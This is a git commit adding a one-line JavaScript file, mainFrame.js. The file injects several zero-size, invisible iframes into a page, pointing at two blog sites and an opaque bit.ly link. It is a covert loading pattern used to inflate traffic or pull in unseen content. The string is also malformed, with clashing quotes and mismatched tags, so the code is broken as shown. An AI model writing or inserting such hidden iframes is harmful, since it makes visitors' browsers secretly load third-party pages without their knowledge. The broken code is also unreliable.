634bc6dcd432cc0bfcf2e294543ef029773c3725
Zero <liambocakra@gmail.com>
2019-07-05 22:05:37 +0800

    Create mainFrame.js

---
+++ mainFrame.js
@@ -0,0 +1,1 @@
+document.getElementById("container").innerHTML = "<iframe src='//blog.valeiriya.osaka/' width='0' height='0'></iframe><iframe src="//shirotenshii.blogspot.com/" width="0" height="0"/></iframe><iframe src="//bit.ly/2X464Ny" height="1" width="0"/></iframe><iframe src="https://blog.valeiriya.osaka/" width="0" height="0"/></iframe>";
